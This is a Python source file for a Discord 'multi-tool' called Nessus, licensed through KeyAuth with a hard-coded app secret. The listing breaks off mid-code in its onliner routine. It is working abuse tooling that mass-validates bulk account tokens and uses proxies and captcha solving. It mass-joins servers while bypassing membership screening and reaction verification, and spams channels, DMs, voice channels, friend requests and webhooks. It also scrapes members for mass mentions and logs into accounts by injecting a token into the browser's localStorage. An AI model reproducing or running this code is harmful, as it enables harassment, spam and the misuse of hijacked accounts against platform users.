from keyauth import api

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime

# import json as jsond
# ^^ only for auto login/json writing/reading

# watch setup video if you need help https://www.youtube.com/watch?v=L2eAQOmuUiA

if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title >Nessus Login')  # clear console, change title
elif platform.system() == 'Linux':
    os.system('clear')  # clear console
    sys.stdout.write("\x1b]0;Nessus Login\x07")  # change title
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  # clear console
    os.system('''echo - n - e "\033]0;Nessus Login\007"''')  # change title

print("Initializing")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "Nessus",
    ownerid = "8EvQ9nftVi",
    secret = "3344420db244274053c89de223004f27eeb9645ff39efe34065beedf83137f17",
    version = "1.0",
    hash_to_check = getchecksum()
)

print(f"""
App data:
Number of users: {keyauthapp.app_data.numUsers}
Number of online users: {keyauthapp.app_data.onlineUsers}
Number of keys: {keyauthapp.app_data.numKeys}
Application Version: {keyauthapp.app_data.app_ver}
""")
print(f"Current Session Validation Status: {keyauthapp.check()}")
print(f"Blacklisted? : {keyauthapp.checkblacklist()}")  # check if blacklisted, you can edit this and make it exit the program if blacklisted

subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
for i in range(len(subs)):
    sub = subs[i]["subscription"]  # Subscription from every Sub
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")

onlineUsers = keyauthapp.fetchOnline()
OU = ""  # KEEP THIS EMPTY FOR NOW, THIS WILL BE USED TO CREATE ONLINE USER STRING.
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "

print("\n" + OU + "\n")

print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")

import os
os.system("cls & title Nessus - Loading...")
from src import MultiTool, MPrint, Utility, scrape, global_variables, _captcha, DiscordSocket
import json
import threading
import random
import sys
import emoji
import time
import requests, threading
from time import sleep
import easygui
import asyncio
import pyfiglet
from pynput import keyboard
import threading
from traceback import format_exc
from typing import Union
from colorama import Back, Fore, Style
from tasksio import TaskPool
import websocket
from websocket import WebSocket
from json import dumps
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from selenium import webdriver

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.05)
        
def SlowPrint(_str):
    for letter in _str:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.01)

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v10/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}


# VARIABLES
console = MPrint()
goodtokens = []
seen = {}
duplicates = 0
notjoined = 0
lockedtokens = 0
invalidTokens = 0
console = MPrint()
BUILD_NUM = Utility().getBuildNum()
ashblocks = 'DyYnka#9733'
#Colors
b = Fore.BLACK
g = Fore.GREEN
y = Fore.YELLOW
c = Fore.CYAN
w = Fore.LIGHTWHITE_EX
m = Fore.LIGHTMAGENTA_EX
r = Fore.RED
b = Fore.BLUE
lb = Fore.LIGHTBLUE_EX

print(f"""     

                                 {Fore.LIGHTMAGENTA_EX}   ▀█▄   ▀█▀                                       
                                 {Fore.LIGHTMAGENTA_EX}    █▀█   █    ▄▄▄▄   ▄▄▄▄ {Fore.LIGHTWHITE_EX}  ▄▄▄▄  ▄▄▄ ▄▄▄   ▄▄▄▄  
                                 {Fore.LIGHTMAGENTA_EX}    █ ▀█▄ █  ▄█▄▄▄██ ██▄ ▀ {Fore.LIGHTWHITE_EX} ██▄ ▀   ██  ██  ██▄ ▀  
                                 {Fore.LIGHTMAGENTA_EX}    █   ███  ██      ▄ ▀█▄▄{Fore.LIGHTWHITE_EX} ▄ ▀█▄▄  ██  ██  ▄ ▀█▄▄ 
                                 {Fore.LIGHTMAGENTA_EX}   ▄█▄   ▀█   ▀█▄▄▄▀ █▀▄▄█▀{Fore.LIGHTWHITE_EX} █▀▄▄█▀  ▀█▄▄▀█▄ █▀▄▄█▀ 
                                                
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡿⢟⣿⠛⢉⣿⣤⣤⣿⣷⣶⣾⣷⣼⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣡⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀Discord is currently on build: {w}{BUILD_NUM}{w}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⢙⢛⣛⠻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⢛⣝⣖⠀⠀⠀⡐⢸⡟⢹⡿⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠷⣿⣀⡹⠂⠀⠀⠀⠘⠛⠉⠁⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠤⠴⠒⠁⠀⢀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⢿⣿⣟⣉⣦⣀⡀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠁⠀⠈⢿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⢿⣯⣍⡿⢷⡦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠢⡀⠀⠸⡇⠉⢻⣿⣿⣿⣿⣯⣭⣀⣸⣿⣿⣧⡀⠈⢄⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠈⠢⠀⢳⠀⠀⠙⢿⣿⠫⠙⠛⠛⠛⣿⡿⠿⣇⠀⠸⠆⢈⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⡣⢀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠙⠅⠀⠀⢀⣾⣿⠁⢀⡎⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠈⠐⠠⡀⡀⠀⠀⠀⠂⡄⠀⠀⢈⠶⣤⣤⣭⣥⣤⣾⡇⠑⢴⠆⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⡁⠒⢄⣀⠀⠀⢐⠤⠁⠀⠡⡏⢫⡫⣺⣻⡇⠀⢨⢄⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⠊⠀⠀⠀⠀⠀⡇⢀⠀⢸⣷⣦⡉⠀⠀⠀⠀⠈⢇⡻⢎⡫⠇⠀⡆⢨⣧⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠁⠆⢠⣿⣿⣿⣿⣿⣶⣄⡀⠀⠈⢻⣟⣱⠀⠘⢰⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠰⠆⠀⠀⠀⠀⠀⠀⠀⠀⢐⠂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⢹⣿⠀⣠⣿⣿⣿⣿⣧⠀""")
os.system("title Nessus - PRESS ANY KEY")
os.system('pause >nul')

# SYNC functions
def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')
def showMenu():
    clearConsole()
    print(f"""

                                 {Fore.LIGHTMAGENTA_EX}   ▀█▄   ▀█▀                                       
                                 {Fore.LIGHTMAGENTA_EX}    █▀█   █    ▄▄▄▄   ▄▄▄▄ {Fore.LIGHTWHITE_EX}  ▄▄▄▄  ▄▄▄ ▄▄▄   ▄▄▄▄  
                                 {Fore.LIGHTMAGENTA_EX}    █ ▀█▄ █  ▄█▄▄▄██ ██▄ ▀ {Fore.LIGHTWHITE_EX} ██▄ ▀   ██  ██  ██▄ ▀  
                                 {Fore.LIGHTMAGENTA_EX}    █   ███  ██      ▄ ▀█▄▄{Fore.LIGHTWHITE_EX} ▄ ▀█▄▄  ██  ██  ▄ ▀█▄▄ 
                                 {Fore.LIGHTMAGENTA_EX}   ▄█▄   ▀█   ▀█▄▄▄▀ █▀▄▄█▀{Fore.LIGHTWHITE_EX} █▀▄▄█▀  ▀█▄▄▀█▄ █▀▄▄█▀  
                                                

                                        {m}[{w}1{m}]{w} Checker          {m}[{w}9{m}]{w} Friend Spammer
                                        {m}[{w}2{m}]{w} Joiner           {m}[{w}10{m}]{w} Webhook Spammer
                                        {m}[{w}3{m}]{w} Leaver           {m}[{w}11{m}]{w} Nickname Changer
                                        {m}[{w}4{m}]{w} Onliner          {m}[{w}12{m}]{w} Username Changer
                                        {m}[{w}5{m}]{w} Spammer          {m}[{w}13{m}]{w} Token Login
                                        {m}[{w}6{m}]{w} DM Spammer       {m}[{w}14{m}]{w} ID Scraper
                                        {m}[{w}7{m}]{w} VC Spammer       {m}[{w}15{m}]{w} Token Formatter
                                        {m}[{w}8{m}]{w} Hypesquad        {m}[{w}16{m}]{w} Restart
""")
def changeFormat(token: str):
    if ":" not in token or len(token.split(":")) == 2:
        token = token if ":" not in token else token.split(":")[1]
        print(
            f" {m}[{w}FAILURE{m}] [{w}{token}{m}] {w}Correct format{m}: [{w}Email{m}:{w}Pass{m}:{w}Token{m}]")
        return token
    newToken = token.split(":")[2]
    print(f" {m}[{w}SUCCESS{m}] [{w}{newToken}{m}]")
    return newToken
def setTitle(tokens: list): return os.system(
    f'title Nessus - Tokens: {len(tokens)} - Proxies: {len(open("input/proxies.txt").read().splitlines())} - By {ashblocks}' if os.name == "nt" else f'echo -n -e "\033]0;Nessus | Tokens {len(tokens)} | Proxies {len(open("input/proxies.txt").read().splitlines())} | Captcha Balance: $ {_captcha.Captcha().getBalance()} - By {ashblocks}"'
)

async def leave(token: str, guildId: str):
    o = await buildMultiTool(token)
    await o.leave(guildId)

async def buildMultiTool(token: str) -> MultiTool:
    try:
        m = MultiTool()
        await m._init(token)
        return m
    except Exception as e:
        print(f"Error while building multitool: {e}")
        return await buildMultiTool(token)


async def checkToken(token: str):
    global lockedtokens
    global invalidTokens
    m = await buildMultiTool(token)
    if m == None:
        return None
    res, typee = await m.checkToken()
    if typee == "LOCKED":
        lockedtokens += 1
        return False
    if typee == "INVALID":
        invalidTokens += 1
    if res:
        goodtokens.append(token)
        return True

def vcSpammer(token: str, guild: str, channelId: str):
    while True:
        sock = DiscordSocket(token)
        sock.run(channelId, guild)
        print(f"{m}[{w}VC{m}] {w}Joined")

async def sendMessage(token: str, channelId: str, message: str, massMention: bool, massMentionSize: int):
    m = await buildMultiTool(token)
    if m == None:
        return None
    while True:
        await m.sendMessageInChannel(
            message, channelId, massMention, massMentionSize)
            
async def friendRequest(token: str, username: str, discrim: str):
    m = await buildMultiTool(token)
    await m.sendFriendRequest(username, discrim)

async def usernameChanger(token: str, username: str):
    if ":" not in token:
        print(f" {m}[{w}FAILURE{m}] [{w}{token}{m}] {w}Correct format{m}: [{w}Email{m}:{w}Pass{m}:{w}Token{m}]")
        print(f"{w}")
        os.system('pause')
        return await menu()
        return None
    spllited = token.split(":")
    password = spllited[1]
    token = spllited[2]
    m = await buildMultiTool(token)
    await m.usernameChange(username, password)

async def scrapeMassMention(token, guildId, channelId):
    o = await buildMultiTool(token)
    res = await o.getGuild(guildId)
    if "name" not in res:
        return await scrapeMassMention(random.choice(open("input/tokens.txt").read().splitlines()), guildId, channelId)
    open("scraped/massmention.txt", "w").write("")
    print(f"{w}[{lb}>{w}] Scraping from {w}[{lb}{guildId}{w}]")
    members = scrape(token, guildId, channelId)
    for member in members:
        print(f"{w}[{lb}>{w}] Scraped: {lb}{member}{w}")
        open("scraped/massmention.txt", "a").write(member + "\n")
    print(f"{w}[{lb}>{w}] Total Scrapped: {lb}{len(members)}{w}")
    return True
    
async def scrapeMembers(token, guildId, channelId):
    o = await buildMultiTool(token)
    res = await o.getGuild(guildId)
    if "name" not in res:
        return await scrapeMembers(random.choice(open("input/tokens.txt").read().splitlines()), guildId, channelId)
    open("scraped/massmention.txt", "w").write("")
    print(f"{w}[{lb}>{w}] Scraping from {w}[{lb}{guildId}{w}]")
    members = scrape(token, guildId, channelId)
    for member in members:
        print(f"{w}[{lb}>{w}] Scraped: {lb}{member}{w}")
        open("scraped/massmention.txt", "a").write(member + "\n")
    print(f"{w}[{lb}>{w}] Total Scrapped: {lb}{len(members)}{w}")
    return True
            
async def friendRequest(token: str, username: str, discrim: str):
    m = await buildMultiTool(token)
    await m.sendFriendRequest(username, discrim)

async def spamMessages(token: str, userId: str, message: str):
    m = await buildMultiTool(token)
    if not m:
        return None
    while True:
        _, _res = await m.sendDirectMessage(userId, message)
        if _:
            print(f"{w}[{lb}SENT{w}] {message}")
        else:
            print(f"{w}[{r}FAILURE{w}] {message}")

async def join(token: str, rawInvite: str, ctx: str, guildId: str, channelId: Union[str, None] = None, messageId: Union[str, None] = None):
    global notjoined
    m = await buildMultiTool(token)
    if m == None:
        return None
    res, req = await m.join(rawInvite, ctx)
    if not res:
        notjoined += 1
        return res
    if Utility().config["joiner"]["bypassMembershipScreening"] and "show_verification_form" in req.json():
        await m.bypassScreening(guildId, rawInvite)
    if Utility().config["joiner"]["bypassReactionVerification"] and channelId != None:
        emojiObj = await m.getReactions(messageId, channelId)
        if emojiObj["id"] == None:
            emojiOut = emoji.demojize(
                emojiObj["name"]
            )
        else:
            emojiOut = emojiObj["name"] + "%3A" + emojiObj["id"]
        if emojiOut[0] == ":" and emojiOut[len(emojiOut) - 1] == ":":
            emojiOut = emoji.emojize(emojiOut)
        await m.addReaction(messageId, channelId, emojiOut)
    return res
    
async def menu():

    global duplicates
    global notjoined
    global lockedtokens
    global invalidTokens
    try:
        tokens = open("input/tokens.txt").read().splitlines()
        setTitle(tokens)
        showMenu()
        choice = int(input(
            f"{w}[{lb}>{w}] Input: "))
        if choice == 1:
            Spinner()
            print("\n")
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    if token in seen:
                        duplicates += 1
                        continue
                    seen[token] = True
                    await pool.put(checkToken(token))
            print(
                f" {w}Duplicates: {lb}{duplicates} {w}| {w}Valid: {lb}{len(goodtokens)} {w}| {w}Invalid: {lb}{invalidTokens} {w}| {w}Locked Tokens: {lb}{lockedtokens} {w}| {w}Total Bad Tokens: {lb}{invalidTokens + lockedtokens}\n")
            seen.clear()
            duplicates = 0
            lockedtokens = 0
            invalidTokens = 0
            if Utility().config["removeDeadTokens"]:
                open("input/tokens.txt", "w").write("")
                for goodtoken in goodtokens:
                    open("input/tokens.txt", "a").write(f"{goodtoken}\n")
            goodtokens.clear()
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()
            
            
        if choice == 2:
            Spinner()
            print("\n")
            rawInvite = input(f"{w}[{lb}>{w}] Invite link: ").split(
            "discord.gg/")[1]
            try:
              req1 = Utility().getInviteInfo(rawInvite)
              if req1 == {"message": "Unknown Invite", "code": 10006}:
                print(f"({lb}https://discord.gg/{rawInvite}{w}) is {w}[{r}INVALID{w}]")
                time.sleep(1)
                print(f"{w}")
                SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
                os.system("pause >nul")
                return await menu()
            except:
                ("Failed to get invite info, You are probably ratelimited, try using a VPN")
                req1 = {"guild": { "id": None }, "channel": { "id": None }}
                if Utility().config.get("proxy")["proxyless"]: # if proxyless is true, redirect back to `menu` otherwise keep joining
                    time.sleep(1)
                    print(f"{w}")
                    SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
                    os.system("pause >nul")
                    return await menu()
            print(f"({lb}https://discord.gg/{rawInvite}{w}) is {w}[{g}VALID{w}]")
            ctx = Utility().getContextProperties(
                req1["channel"]["id"], req1["guild"]["id"])
            deley = Utility().config["joiner"]["delay"]
            useDelay = Utility().config["joiner"]["useDelays"]
            channelId = None
            messageId = None
            if Utility().config["joiner"]["bypassReactionVerification"]:
                channelId = input(
                    f"{w}[{lb}REACTION{w}] Channel ID: ")
                messageId = input(
                    f"{w}[{lb}REACTION{w}] Message ID: ")
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    if token in seen:
                        duplicates += 1
                        continue
                    seen[token] = True
                    await pool.put(join(token, rawInvite, ctx, req1["guild"]["id"], channelId, messageId))
                    if useDelay:
                        await asyncio.sleep(deley)
            print(
                f"{w}[{lb}SUCCESS{w}] Tokens successfully joined ({lb}https://discord.gg/{rawInvite}{w}) \nDuplicate Tokens: {lb}{duplicates}{w} | Joined Tokens: {lb}{len(tokens) - notjoined}{w} | Not Joined: {lb}{notjoined}{lb}")
            seen.clear()
            duplicates = 0
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()

        if choice == 5:
            Spinner()
            print("\n")
            massMention = True if input(
                f"{w}[{lb}>{w}] Mass Mention? (y/n): ").lower() == "y" else None
            massMentionSize = None if massMention != True else int(input(
                f"{w}[{lb}>{w}] Amount of mentions per message: "))
            message = input(
                f"{w}[{lb}>{w}] Message: ")
            channelId = input(
                f"{w}[{lb}>{w}] Channel ID: ")
            m = await buildMultiTool(random.choice(tokens))
            guildId = await m.getChannel(channelId)

            if massMention and input(f"{w}[{lb}>{w}] Do you want to use already scrapped members for massmention? (y/n): ").lower() != "y":
                await scrapeMassMention(random.choice(tokens), guildId, channelId)
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    await pool.put(sendMessage(token, channelId, message, massMention, massMentionSize))
      
        if choice == 14:
            Spinner()
            print("\n")
            channelId = input(
                f"{w}[{lb}>{w}] Channel ID: ")
            m = await buildMultiTool(random.choice(tokens))
            guildId = await m.getChannel(channelId)
            await scrapeMembers(random.choice(tokens), guildId, channelId)
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu() 
            
        if choice == 13:
            Spinner()
            print("\n")
            t = input(f"{w}[{lb}>{w}] Token: ")
            driver = webdriver.Chrome('chromedriver.exe')
            driver.get('https://discord.com/login')
            js = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
            driver.execute_script(js + f'login("{t}")')
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()
            
        if choice == 12:
            Spinner()
            print("\n")
            usernames = open("input/usernames.txt").read().splitlines()
            if len(usernames) == 0:
                print(
                    f"{w}[{r}FAILURE{w}] No usernames were detected (Input usernames)")
                time.sleep(1)
                print(f"{w}")
                SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
                os.system("pause >nul")
                return await menu()
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    await pool.put(usernameChanger(token, random.choice(usernames)))
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()


        if choice == 8:
            Spinner()
            print("\n")
            SlowPrint(f"{w}[{r}!{w}]{r} This feature is currently broken!{w}")
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()
            
        if choice == 11:
            Spinner()
            print("\n")
            def changenick(server, nickname, token):
                headers = mainHeader(token)

                r = requests.patch(f"https://discord.com/api/v10/guilds/{server}/members/@me/nick", headers=headers,
                                   json={"nick": nickname})
                if r.status_code == 200:
                    print(f'{w}[{lb}DONE{w}] Nickname was changed to {nick}')
                if r.status_code != 200:
                    print(f'{w}[{r}FAILURE{w}] Failed to change nickname')

            tokens = open('input/tokens.txt', 'r').read().splitlines()
            server = input(f"{w}[{lb}>{w}] Server ID: ")
            nick = input(f"{w}[{lb}>{w}] Nickname: ")
            for token in tokens:
                threading.Thread(target=changenick, args=(server, nick, token)).start()
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()
            
        if choice == 9:
            Spinner()
            print("\n")
            spllited = input(
                f"{w}[{lb}>{w}] Username + Tag: ").split("#")
            username = spllited[0]
            discrim = spllited[1]
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    await pool.put(friendRequest(token, username, discrim))
                    time.sleep(1)
                    print(f"{w}")
                    SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
                    os.system("pause >nul")
                    return await menu()



        if choice == 10:
            Spinner()
            print("\n")
            session = requests.Session()
            webhook = input(f"{w}[{lb}>{w}] Webhook link: ")
            message = input(f"{w}[{lb}>{w}] Message: ")
            username = input(f"{w}[{lb}>{w}] Username: ")
            
            def webhook():
                session.post(webhook,json = {"content":message,"username":username})
    
                while True:
                    for i in range(15):
                        threading.Thread(target=webhook).start()
            webhook()
            

        if choice == 6:
            Spinner()
            print("\n")
            message = input(
                f"{w}[{lb}>{w}] Message: ")
            userId = input(
                f"{w}[{lb}>{w}] User ID: ")
            async with TaskPool(10_000) as pool:
                for token in tokens:
                    await pool.put(spamMessages(token, userId, message))
            time.sleep(1)
            print(f"{w}")
            SlowPrint(f"{w}[{lb}>{w}] Press any key to continue. . . ")
            os.system("pause >nul")
            return await menu()

        if choice == 7:
            Spinner()
            print("\n")
            channelId = input(f"{w}[{lb}>{w}] Channel ID: ")
            m = await buildMultiTool(random.choice(tokens)) # build the multitool coroutine
            guildId = await m.getChannel(channelId=channelId)
            pool = ThreadPool(10_000)
            for token in tokens:
                if token in seen:
                    continue
                seen[token] = True
                pool.apply_async(vcSpammer, (token, guildId, channelId, ))
            pool.join()

        if choice == 4:
             Spinner()
             print("\n")
             name = input(
                 f"{w}[{lb}>{w}] Name: ")
             details = input(
                 f"{w}[{lb}>{w}] Details: ")
             state = input(
                 f"{w}[{lb}>{w}] State: ")
             config = {
                 "details": f"{details}",
                 "state": f"{state}",
                 "name": f"{name}",
             }
             class Onliner:
                 def __init__(self, token) -> None:
                     self.token    = token
                     self.statuses = ["online", "idle", "dnd"]

                 def __online__(self):
                     ws = websocket.WebSocket()
                     ws.connect("wss://gateway.discord.gg/?encoding=json&v=10")
                     response = ws.recv()
                     event = json.loads(response)
                     heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
                     ws.send(
                         json.dumps(
                             {
                                 "op": 2,
                                 "d": {
                                     "token": self.token,
                                     "properties": {
                                         "$os": sys.platform,
                                         "$browser": "RTB",
                                         "$device": f"{sys.platform} Device",
                                     },
                                     "presence": {
                                         "game": {
